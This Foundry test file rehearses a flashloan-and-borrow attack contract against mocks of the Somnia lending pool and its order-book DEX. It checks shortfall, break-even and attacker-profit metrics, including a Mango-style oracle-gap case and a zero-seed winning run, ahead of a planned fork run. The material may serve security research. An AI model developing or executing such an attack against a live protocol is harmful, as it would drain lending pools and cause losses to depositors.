// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {SomniaConfig, SomniaMetrics} from "../src/Interfaces.sol";
import {SomniaLendAttack} from "../src/SomniaLendAttack.sol";
import {MockERC20, MockFeed, MockLendPool, MockOracle, MockSpotPool, MockWrappedNative} from "./mocks/Mocks.sol";

/// @notice Local rehearsal of the attack's call sequence against Somnia-shaped mocks.
///
///         Purpose: prove the wiring (flashloan -> IOC buy -> wrap -> supply -> borrow max ->
///         repay) and the accounting (coverage, shortfall, profit) behave correctly BEFORE
///         spending a fork run on them. Every number here is synthetic. Nothing in this file is
///         evidence about Somnia; the fork run is.
contract RehearsalTest is Test {
    address internal constant NATIVE = 0x28f34DeFd2b4CB48d9eE6d89f2Be4Bc601694c00;
    address internal constant USD = address(0x5555);

    MockERC20 internal usdc;
    MockWrappedNative internal wsomi;
    MockERC20 internal usdso;
    MockERC20 internal weth;
    MockERC20 internal wbtc;
    MockOracle internal oracle;
    MockLendPool internal pool;
    MockSpotPool internal somiMarket;
    MockSpotPool internal usdcMarket;
    MockSpotPool internal wethMarket;
    MockSpotPool internal wbtcMarket;
    MockFeed internal somiFeed;

    function setUp() public {
        usdc = new MockERC20("Bridged USDC", "USDC.e", 6);
        wsomi = new MockWrappedNative();
        usdso = new MockERC20("Genius Dollar", "USDso", 18);
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        wbtc = new MockERC20("Wrapped BTC", "WBTC", 8);

        oracle = new MockOracle();
        somiFeed = new MockFeed(1e8, block.timestamp);
        oracle.setSource(address(wsomi), address(somiFeed));
        oracle.setPrice(address(usdso), 1e8);
        oracle.setPrice(address(usdc), 1e8);
        oracle.setPrice(address(weth), 3_000e8);
        oracle.setPrice(address(wbtc), 60_000e8);

        pool = new MockLendPool(address(oracle));
        pool.addReserve(address(wsomi), 8_000, 8_250, true);
        pool.addReserve(address(usdso), 7_500, 8_000, true);
        pool.addReserve(address(usdc), 8_000, 8_500, true);
        pool.addReserve(address(weth), 8_000, 8_250, true);
        pool.addReserve(address(wbtc), 7_000, 7_500, true);

        somiMarket = new MockSpotPool(NATIVE, address(usdso), 1e16, 1e18, 1e18, 100); // 10 bps taker
        usdcMarket = new MockSpotPool(address(usdc), address(usdso), 1e4, 1e6, 1e6, 100);
        wethMarket = new MockSpotPool(address(weth), address(usdso), 1e14, 1e15, 1e15, 100);
        wbtcMarket = new MockSpotPool(address(wbtc), address(usdso), 1e6, 1e6, 1e6, 100);

        // Deep-ish books, quoted 1:1 against USDso.
        somiMarket.setBook(1e18, 100_000e18, 1e18, 100_000e18);
        usdcMarket.setBook(1e18, 1_000_000e6, 1e18, 1_000_000e6);

        // Pool cash for borrowing and flashloans.
        usdso.mint(address(this), 10_000_000e18);
        usdc.mint(address(this), 10_000_000e6);
        usdso.approve(address(pool), type(uint256).max);
        usdc.approve(address(pool), type(uint256).max);
        pool.fund(address(usdso), 10_000_000e18);
        pool.fund(address(usdc), 10_000_000e6);

        // CLOB inventory so it can actually deliver, exactly like maker deposits on-chain.
        vm.deal(address(somiMarket), 1_000_000 ether);
        usdso.mint(address(somiMarket), 5_000_000e18);
        usdc.mint(address(usdcMarket), 5_000_000e6);
        usdso.mint(address(usdcMarket), 5_000_000e18);
        usdc.mint(address(somiMarket), 5_000_000e6);
    }

    function _config() internal view returns (SomniaConfig memory c) {
        c.pool = address(pool);
        c.oracle = address(oracle);
        c.wsomi = address(wsomi);
        c.usdc = address(usdc);
        c.weth = address(weth);
        c.usdso = address(usdso);
        c.wbtc = address(wbtc);
        c.somiUsdso = address(somiMarket);
        c.usdcUsdso = address(usdcMarket);
        c.wethUsdso = address(wethMarket);
        c.wbtcUsdso = address(wbtcMarket);
    }

    function _params() internal pure returns (SomniaLendAttack.Params memory p) {
        p.buyLimitBps = 10_500;
        p.sellLimitBps = 9_500;
        p.borrowBps = 10_000;
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Case 1: LTV cannot cover the flash. Must revert with metrics, and the metrics must be sane.
    // ─────────────────────────────────────────────────────────────────────────────

    function test_rehearsal_unfavourable_ltv_reports_shortfall() public {
        SomniaLendAttack attacker = new SomniaLendAttack(_config());

        try attacker.runSomiPumpSupply(1_000e18, _params()) {
            revert("expected shortfall");
        } catch (bytes memory reason) {
            (bool ok, SomniaMetrics memory m) = attacker.decodeShortfall(reason);
            assertTrue(ok, "shortfall metrics must decode");
            assertFalse(m.repaid);
            // The pool reserves input at the limit price (1.05x best ask), so ~95% of the budget
            // turns into base. That reservation is real dreamDEX behaviour, not a mock artefact.
            assertGt(m.preTradeBaseTraded, 800e18, "most of the budget bought base");
            assertGt(m.preTradeQuoteTraded, 800e18, "spent most of the flash");
            assertEq(m.collateralOracleAfter, 1e8, "oracle unchanged by the trade");
            assertEq(m.ltvBps, 8_000);
            assertLt(m.coverageBps, 10_000, "80% LTV cannot cover a 1:1 fill");
            assertLt(m.maxNetBase, 0);
            assertGt(m.shortfallFlashAsset, 0);
            console2.log("coverage bps", m.coverageBps);
            console2.log("shortfall (USDso)", m.shortfallFlashAsset);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Case 2: the Mango shape. Oracle values the collateral above the CLOB ask; the round trip
    //         repays the flashloan and keeps a positive USDso balance.
    // ─────────────────────────────────────────────────────────────────────────────

    function test_rehearsal_oracle_above_dex_is_profitable() public {
        somiFeed.set(2e8, block.timestamp); // protocol thinks 1 SOMI = 2 USDso

        SomniaLendAttack attacker = new SomniaLendAttack(_config());
        attacker.runSomiPumpSupply(1_000e18, _params());

        SomniaMetrics memory m = attacker.metrics();
        console2.log("coverage bps", m.coverageBps);
        console2.log("leftover USDso", m.finalUsdso);

        assertTrue(m.repaid, "flash repaid");
        assertTrue(attacker.isProfitable(m), "should retain USDso");
        assertGt(m.finalUsdso, 0);
        // Borrowed amount in base currency must match the power the pool reported, to the shave.
        uint256 borrowedBase = (m.borrowUsdso * m.debtOracleAfter) / 1e18;
        assertApproxEqAbs(borrowedBase, m.postSupplyAvailableBorrowsBase, 1e8, "borrowed all available power");
        assertGt(m.coverageBps, 10_000);
        assertGt(m.unitEdgeBps, 0);
        // The oracle did NOT move here: the whole edge is the gap between the CLOB price and the
        // protocol's valuation. This is the "correct oracle, exploitable economics" case.
        assertEq(m.collateralOracleBefore, m.collateralOracleAfter);
        assertEq(m.borrowPowerInflationBase, 0, "no price move, so no inflation from the trade");
        // Profit must equal borrow power minus what the flash pulled.
        // maxNetBase is 8-decimal base currency; USDso is 18. Compare in USDso units.
        assertApproxEqAbs(m.finalUsdso, uint256(m.maxNetBase) * 1e10, 1e18, "profit is exactly the net");
        assertEq(m.unspentFlashAsset, 1_000e18 - m.preTradeQuoteTraded, "unspent principal tracked");
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Case 2b: the same shape in the USDso direction (flash USDC, bid USDso up, borrow USDC).
    // ─────────────────────────────────────────────────────────────────────────────

    function test_rehearsal_usdso_direction_reports_both_outcomes() public {
        // Baseline: 1:1 book and 1:1 oracle -> cannot cover LTV + premium.
        SomniaLendAttack losing = new SomniaLendAttack(_config());
        try losing.runUsdsoPumpSupply(1_000e6, _params()) {
            revert("expected shortfall");
        } catch (bytes memory reason) {
            (bool ok, SomniaMetrics memory m) = losing.decodeShortfall(reason);
            assertTrue(ok, "metrics must decode for the USDso direction too");
            assertGt(m.preTradeBaseTraded, 800e6, "sold most of the flash USDC");
            assertEq(m.preTradeQuoteTraded, m.suppliedCollateral, "all USDso proceeds supplied");
            assertLt(m.coverageBps, 10_000);
            console2.log("usdso-direction coverage bps (losing)", m.coverageBps);
        }

        // A 10% gap is NOT enough here: break even needs (1+premium)/LTV - 1 = (1.0005/0.75) - 1
        // = 33.4% at a 75% LTV. Set the gap to 40% and the same trade must clear.
        oracle.setPrice(address(usdso), 1.4e8);
        SomniaLendAttack winning = new SomniaLendAttack(_config());
        winning.runUsdsoPumpSupply(1_000e6, _params());
        SomniaMetrics memory w = winning.metrics();
        assertTrue(w.repaid, "flash repaid");
        assertTrue(winning.isProfitable(w), "should retain value");
        assertTrue(w.zeroSeed, "winning run must be zero-seed");
        assertGt(w.attackerLiquidBase, 0);
        console2.log("leftover USDC (6dp)", w.finalUsdc);
        console2.log("attacker liquid base", w.attackerLiquidBase);
        assertGt(w.coverageBps, 10_000);
        console2.log("usdso-direction coverage bps (winning)", w.coverageBps);
    }

    // ─────────────────────────────────────────────────────────────────────────────
    // Case 3: control. A flashloan with no trade must not touch the oracle or the position.
    // ─────────────────────────────────────────────────────────────────────────────

    function test_rehearsal_control_moves_nothing() public {
        somiFeed.set(2e8, block.timestamp);
        SomniaLendAttack attacker = new SomniaLendAttack(_config());
        uint256 premium = (1_000e18 * pool.FLASHLOAN_PREMIUM_TOTAL()) / 10_000;
        usdso.mint(address(attacker), premium); // only the fee the control must pay
        attacker.declareSeed(address(usdso), premium);

        attacker.runControl(address(usdso), 1_000e18);

        SomniaMetrics memory m = attacker.metrics();
        assertEq(m.collateralOracleAfter, m.collateralOracleBefore);
        assertEq(m.preTradeBaseTraded, 0);
        assertEq(m.borrowUsdso, 0);
        assertEq(m.totalDebtBase, 0);
        assertTrue(m.repaid);
        assertEq(m.finalUsdso, 0, "control ends flat");
        assertFalse(attacker.isProfitable(m));
    }
}
